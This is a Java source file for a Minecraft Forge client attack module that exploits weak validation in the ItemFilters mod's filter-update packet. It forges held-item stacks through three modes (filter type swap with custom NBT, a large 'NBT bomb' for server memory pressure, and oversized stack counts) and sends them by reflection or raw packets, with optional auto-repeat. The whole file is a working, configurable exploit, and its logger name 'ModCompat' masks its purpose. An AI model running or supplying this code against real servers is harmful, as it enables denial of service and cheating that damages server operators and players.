package com.redblue.red.modules.itemfilters;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.item.ItemStack;
import net.minecraftforge.fml.ModList;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.List;

/**
 * IF-001: MessageUpdateFilterItem — Filter Type Swap / NBT Injection / Count Manipulation.
 *
 * CONFIRMED via source verification:
 * MessageUpdateFilterItem.handle() only checks:
 *   1. player != null
 *   2. current held item instanceof IItemFilter
 *   3. incoming stack.getItem() instanceof IItemFilter
 * Then directly replaces held item with client-provided ItemStack via player.setItemInHand().
 *
 * Missing validations:
 *   - No GUI open state check
 *   - No item type consistency check (any IItemFilter -> any IItemFilter)
 *   - No NBT validation
 *   - No count validation
 *   - No Container sync
 *
 * Attack approach: Reflect-construct MessageUpdateFilterItem(hand, stack) and call send().
 * Wire format (Architectury NetworkChannel on Forge):
 *   Boolean(hand == MAIN_HAND) + ItemStack(stack)
 */
public class IF01_FilterSwap implements AttackModule {

    private static final Logger LOGGER = LoggerFactory.getLogger("ModCompat");

    private static final String MSG_CLASS =
            "dev.latvian.mods.itemfilters.net.MessageUpdateFilterItem";

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("hand", "目标手",
                "MAIN_HAND", "MAIN_HAND", "OFF_HAND"),
        ConfigParam.ofEnum("mode", "攻击模式",
                "TYPE_SWAP", "TYPE_SWAP", "NBT_BOMB", "COUNT_MANIP"),
        // TYPE_SWAP mode
        ConfigParam.ofItem("target_filter", "替换为过滤器",
                "itemfilters:or")
                .visibleWhen("mode", "TYPE_SWAP"),
        ConfigParam.ofString("custom_nbt", "自定义NBT (SNBT格式, 可选)", "")
                .visibleWhen("mode", "TYPE_SWAP"),
        // NBT_BOMB mode
        ConfigParam.ofInt("bomb_entries", "NBT条目数量", 10000, 100, 1000000)
                .visibleWhen("mode", "NBT_BOMB"),
        ConfigParam.ofBool("confirm_bomb", "确认: NBT炸弹可能影响服务器性能", false)
                .visibleWhen("mode", "NBT_BOMB"),
        // COUNT_MANIP mode
        ConfigParam.ofInt("stack_count", "物品数量", 127, 1, 127)
                .visibleWhen("mode", "COUNT_MANIP"),
        // Repeat
        ConfigParam.ofBool("repeat", "自动重复", false),
        ConfigParam.ofInt("interval", "重复间隔(tick)", 20, 1, 200)
                .visibleWhen("repeat", "true")
    );

    private long lastTick = 0;

    @Override public String id() { return "if01_filterswap"; }
    @Override public String name() { return "过滤器替换"; }

    @Override
    public String description() {
        return "利用MessageUpdateFilterItem替换手持过滤器类型/注入NBT/篡改数量";
    }

    @Override
    public String getTutorial() {
        return "[前提条件]\n"
            + "主手或副手必须持有任意一种ItemFilters过滤器物品\n\n"
            + "[攻击模式]\n"
            + "TYPE_SWAP: 将手持过滤器替换为另一种过滤器(可附带自定义NBT)\n"
            + "NBT_BOMB: 向InventoryFilter注入大量NBT条目造成内存压力\n"
            + "COUNT_MANIP: 篡改过滤器物品的堆叠数量(超过正常上限)\n\n"
            + "[原理]\n"
            + "服务端仅检查新旧物品都实现IItemFilter接口，\n"
            + "不验证类型一致性、NBT合法性或数量范围。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("itemfilters");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        doAttack(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("repeat").map(ConfigParam::getBool).orElse(false)) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        doAttack(mc);
    }

    private void doAttack(Minecraft mc) {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("TYPE_SWAP");
        InteractionHand hand = getHand();

        // Verify held item is an IItemFilter
        ItemStack held = mc.player.getItemInHand(hand);
        if (held.isEmpty()) {
            LOGGER.warn("[IF01] 目标手中没有物品");
            return;
        }

        ItemStack payload;
        switch (mode) {
            case "NBT_BOMB" -> {
                if (!getParam("confirm_bomb").map(ConfigParam::getBool).orElse(false)) {
                    LOGGER.warn("[IF01] NBT炸弹未确认，跳过");
                    return;
                }
                payload = buildNbtBomb();
            }
            case "COUNT_MANIP" -> payload = buildCountManip(held);
            default -> payload = buildTypeSwap(held);
        }

        if (payload == null) return;
        sendUpdatePacket(hand, payload);
    }

    private ItemStack buildTypeSwap(ItemStack held) {
        String filterId = getParam("target_filter").map(ConfigParam::getString)
                .orElse("itemfilters:or");
        String customNbt = getParam("custom_nbt").map(ConfigParam::getString).orElse("");

        try {
            // Create ItemStack for the target filter item
            var rl = new net.minecraft.resources.ResourceLocation(filterId);
            var item = net.minecraftforge.registries.ForgeRegistries.ITEMS.getValue(rl);
            if (item == null || item == net.minecraft.world.item.Items.AIR) {
                LOGGER.warn("[IF01] 找不到物品: {}", filterId);
                return null;
            }
            ItemStack stack = new ItemStack(item, 1);

            // Apply custom NBT if provided
            if (!customNbt.isEmpty()) {
                try {
                    CompoundTag tag = net.minecraft.nbt.TagParser.parseTag(customNbt);
                    stack.setTag(tag);
                } catch (Exception e) {
                    LOGGER.warn("[IF01] NBT解析失败: {}", e.getMessage());
                }
            }
            return stack;
        } catch (Exception e) {
            LOGGER.error("[IF01] buildTypeSwap failed", e);
            return null;
        }
    }

    private ItemStack buildNbtBomb() {
        int entries = getParam("bomb_entries").map(ConfigParam::getInt).orElse(10000);

        try {
            var rl = new net.minecraft.resources.ResourceLocation("itemfilters", "or");
            var item = net.minecraftforge.registries.ForgeRegistries.ITEMS.getValue(rl);
            ItemStack stack = new ItemStack(item, 1);

            // Build large NBT items list
            ListTag list = new ListTag();
            for (int i = 0; i < entries; i++) {
                CompoundTag entry = new CompoundTag();
                entry.putString("id", "minecraft:stone");
                entry.putByte("Count", (byte) 64);
                CompoundTag innerTag = new CompoundTag();
                innerTag.putString("padding_" + i,
                        "A".repeat(Math.min(64, 64))); // moderate per-entry size
                entry.put("tag", innerTag);
                list.add(entry);
            }

            CompoundTag tag = new CompoundTag();
            tag.put("items", list);
            stack.setTag(tag);
            return stack;
        } catch (Exception e) {
            LOGGER.error("[IF01] buildNbtBomb failed", e);
            return null;
        }
    }

    private ItemStack buildCountManip(ItemStack held) {
        int count = getParam("stack_count").map(ConfigParam::getInt).orElse(127);
        ItemStack copy = held.copy();
        copy.setCount(count);
        return copy;
    }

    private InteractionHand getHand() {
        String h = getParam("hand").map(ConfigParam::getString).orElse("MAIN_HAND");
        return "OFF_HAND".equals(h) ? InteractionHand.OFF_HAND : InteractionHand.MAIN_HAND;
    }

    /**
     * Reflect-construct MessageUpdateFilterItem(InteractionHand, ItemStack)
     * and call its send() method, which routes through Architectury NetworkChannel.
     */
    private void sendUpdatePacket(InteractionHand hand, ItemStack stack) {
        try {
            Class<?> msgClass = Class.forName(MSG_CLASS);
            Constructor<?> ctor = msgClass.getDeclaredConstructor(
                    InteractionHand.class, ItemStack.class);
            ctor.setAccessible(true);
            Object msg = ctor.newInstance(hand, stack);

            Method sendMethod = msgClass.getDeclaredMethod("send");
            sendMethod.setAccessible(true);
            sendMethod.invoke(msg);

            LOGGER.info("[IF01] 已发送过滤器替换包 hand={} item={}",
                    hand, stack.getItem());
        } catch (Exception e) {
            LOGGER.error("[IF01] 反射发包失败，回退到原始发包", e);
            sendRawPacket(hand, stack);
        }
    }

    /**
     * Fallback: raw packet via Architectury channel format.
     * Computes packetId from class name UUID, sends on architectury:network.
     */
    private void sendRawPacket(InteractionHand hand, ItemStack stack) {
        try {
            // Compute Architectury packetId
            String className = MSG_CLASS;
            java.util.UUID uuid = java.util.UUID.nameUUIDFromBytes(
                    className.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            String idSuffix = uuid.toString().replace("-", "");
            var packetId = new net.minecraft.resources.ResourceLocation(
                    "itemfilters:main/" + idSuffix);

            var archChannel = new net.minecraft.resources.ResourceLocation(
                    "architectury", "network");

            com.redblue.red.util.PacketForge.send(archChannel, buf -> {
                buf.writeResourceLocation(packetId);
                buf.writeBoolean(hand == InteractionHand.MAIN_HAND);
                buf.writeItem(stack);
            });

            LOGGER.info("[IF01] 原始发包完成");
        } catch (Exception e) {
            LOGGER.error("[IF01] 原始发包也失败了", e);
        }
    }
}
